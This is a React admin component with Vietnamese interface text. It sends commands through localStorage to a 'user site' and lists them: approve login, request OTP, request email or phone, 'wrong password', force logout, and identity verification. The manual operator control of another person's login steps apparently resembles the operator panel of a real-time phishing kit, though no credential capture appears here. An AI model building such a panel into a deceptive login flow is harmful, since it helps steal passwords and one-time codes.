/**
 * Admin Command Test Panel
 * Panel để test các lệnh admin gửi tới user
 */

import React, { useState, useEffect } from "react";
import { motion } from "framer-motion";
import { Button } from "../ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "../ui/card";
import { Input } from "../ui/input";
import { Label } from "../ui/label";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "../ui/select";
import { Textarea } from "../ui/textarea";
import { Badge } from "../ui/badge";
import { useToast } from "../ui/use-toast";
import {
  Send,
  LogOut,
  Shield,
  Bell,
  MessageSquare,
  RotateCcw,
  CheckCircle,
  AlertTriangle,
  Clock,
  Trash2,
} from "lucide-react";

const AdminCommandTestPanel = () => {
  const [commandType, setCommandType] = useState("");
  const [customMessage, setCustomMessage] = useState("");
  const [commandHistory, setCommandHistory] = useState([]);
  const { toast } = useToast();

  useEffect(() => {
    loadCommandHistory();
    const interval = setInterval(loadCommandHistory, 2000);
    return () => clearInterval(interval);
  }, []);

  const loadCommandHistory = () => {
    try {
      const history = JSON.parse(
        localStorage.getItem("adminCommandHistory") || "[]"
      );
      setCommandHistory(history.slice(0, 10));
    } catch (error) {
      console.error("Error loading command history:", error);
    }
  };

  const sendCommand = () => {
    if (!commandType) {
      toast({
        title: "Lỗi",
        description: "Vui lòng chọn loại lệnh",
        variant: "destructive",
      });
      return;
    }

    const command = {
      id: `cmd_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`,
      type: commandType,
      message: customMessage || getDefaultMessage(commandType),
      timestamp: new Date().toISOString(),
      adminId: "test_admin",
      processed: false,
    };

    // Send to user via localStorage
    const commands = JSON.parse(localStorage.getItem("adminCommands") || "[]");
    commands.unshift(command);
    localStorage.setItem(
      "adminCommands",
      JSON.stringify(commands.slice(0, 10))
    );

    // Add to command history
    const history = JSON.parse(
      localStorage.getItem("adminCommandHistory") || "[]"
    );
    history.unshift({
      ...command,
      sentAt: new Date().toISOString(),
      target: "user_site",
    });
    localStorage.setItem(
      "adminCommandHistory",
      JSON.stringify(history.slice(0, 50))
    );

    // Clear form
    setCustomMessage("");
    setCommandType("");

    toast({
      title: "✅ Lệnh đã gửi!",
      description: `Đã gửi lệnh "${command.type}" đến trang user`,
    });

    console.log("🚀 Test Command Sent:", command);
  };

  const getDefaultMessage = (type) => {
    const messages = {
      approve: "Đăng nhập đã được phê duyệt",
      "approve-otp": "Vui lòng nhập mã OTP để tiếp tục",
      "request-email": "Vui lòng xác thực địa chỉ email",
      "request-phone": "Vui lòng xác thực số điện thoại",
      "wrong-password": "Mật khẩu không chính xác, vui lòng thử lại",
      "reset-session": "Phiên đăng nhập đã được reset",
      "force.logout": "Bạn đã bị buộc đăng xuất bởi admin",
      "request.verify": "Vui lòng thực hiện xác minh danh tính",
      notify: "Bạn có thông báo mới từ admin",
    };
    return messages[type] || "Lệnh từ admin";
  };

  const getCommandIcon = (type) => {
    const icons = {
      approve: <CheckCircle className="w-4 h-4 text-green-400" />,
      "approve-otp": <Shield className="w-4 h-4 text-blue-400" />,
      "request-email": <MessageSquare className="w-4 h-4 text-blue-400" />,
      "request-phone": <MessageSquare className="w-4 h-4 text-blue-400" />,
      "wrong-password": <AlertTriangle className="w-4 h-4 text-red-400" />,
      "reset-session": <RotateCcw className="w-4 h-4 text-yellow-400" />,
      "force.logout": <LogOut className="w-4 h-4 text-red-400" />,
      "request.verify": <Shield className="w-4 h-4 text-orange-400" />,
      notify: <Bell className="w-4 h-4 text-blue-400" />,
    };
    return icons[type] || <Bell className="w-4 h-4 text-gray-400" />;
  };

  const clearCommandHistory = () => {
    localStorage.removeItem("adminCommandHistory");
    localStorage.removeItem("adminCommands");
    setCommandHistory([]);

    toast({
      title: "✅ Đã xóa",
      description: "Lịch sử lệnh đã được xóa",
    });
  };

  return (
    <div className="grid grid-cols-1 lg:grid-cols-2 gap-6">
      {/* Send Command Panel */}
      <Card className="bg-slate-900 border-slate-700">
        <CardHeader>
          <CardTitle className="flex items-center gap-2 text-white">
            <Send className="w-5 h-5" />
            Gửi lệnh tới User
          </CardTitle>
        </CardHeader>
        <CardContent className="space-y-4">
          <div>
            <Label htmlFor="command-type" className="text-slate-300">
              Loại lệnh
            </Label>
            <Select value={commandType} onValueChange={setCommandType}>
              <SelectTrigger className="bg-slate-800 border-slate-600 text-white">
                <SelectValue placeholder="Chọn loại lệnh..." />
              </SelectTrigger>
              <SelectContent className="bg-slate-800 border-slate-700">
                <SelectItem value="approve">✅ Phê duyệt đăng nhập</SelectItem>
                <SelectItem value="approve-otp">🔐 Yêu cầu OTP</SelectItem>
                <SelectItem value="request-email">📧 Xác thực Email</SelectItem>
                <SelectItem value="request-phone">📱 Xác thực SĐT</SelectItem>
                <SelectItem value="wrong-password">❌ Sai mật khẩu</SelectItem>
                <SelectItem value="reset-session">🔄 Reset session</SelectItem>
                <SelectItem value="force.logout">🚪 Buộc đăng xuất</SelectItem>
                <SelectItem value="request.verify">
                  🛡️ Yêu cầu xác minh
                </SelectItem>
                <SelectItem value="notify">📢 Thông báo</SelectItem>
              </SelectContent>
            </Select>
          </div>

          <div>
            <Label htmlFor="custom-message" className="text-slate-300">
              Tin nhắn tùy chỉnh (tùy chọn)
            </Label>
            <Textarea
              id="custom-message"
              value={customMessage}
              onChange={(e) => setCustomMessage(e.target.value)}
              placeholder="Nhập tin nhắn tùy chỉnh..."
              className="bg-slate-800 border-slate-600 text-white"
              rows={3}
            />
          </div>

          <Button
            onClick={sendCommand}
            className="w-full bg-blue-600 hover:bg-blue-700"
            disabled={!commandType}
          >
            <Send className="w-4 h-4 mr-2" />
            Gửi lệnh
          </Button>
        </CardContent>
      </Card>

      {/* Command History */}
      <Card className="bg-slate-900 border-slate-700">
        <CardHeader>
          <div className="flex items-center justify-between">
            <CardTitle className="flex items-center gap-2 text-white">
              <Clock className="w-5 h-5" />
              Lịch sử lệnh ({commandHistory.length})
            </CardTitle>
            <Button
              variant="outline"
              size="sm"
              onClick={clearCommandHistory}
              className="border-slate-600 text-slate-300 hover:bg-slate-800"
            >
              <Trash2 className="w-4 h-4" />
            </Button>
          </div>
        </CardHeader>
        <CardContent>
          <div className="space-y-3 max-h-96 overflow-y-auto">
            {commandHistory.length === 0 ? (
              <div className="text-center text-slate-400 py-8">
                Chưa có lệnh nào được gửi
              </div>
            ) : (
              commandHistory.map((cmd, index) => (
                <motion.div
                  key={cmd.id}
                  initial={{ opacity: 0, y: 20 }}
                  animate={{ opacity: 1, y: 0 }}
                  transition={{ delay: index * 0.1 }}
                  className="bg-slate-800 border border-slate-700 rounded-lg p-3"
                >
                  <div className="flex items-start justify-between">
                    <div className="flex items-center gap-2">
                      {getCommandIcon(cmd.type)}
                      <div>
                        <Badge variant="outline" className="text-xs">
                          {cmd.type}
                        </Badge>
                        <div className="text-sm text-slate-300 mt-1">
                          {cmd.message}
                        </div>
                      </div>
                    </div>
                    <div className="text-xs text-slate-500">
                      {new Date(cmd.timestamp).toLocaleTimeString()}
                    </div>
                  </div>
                </motion.div>
              ))
            )}
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default AdminCommandTestPanel;
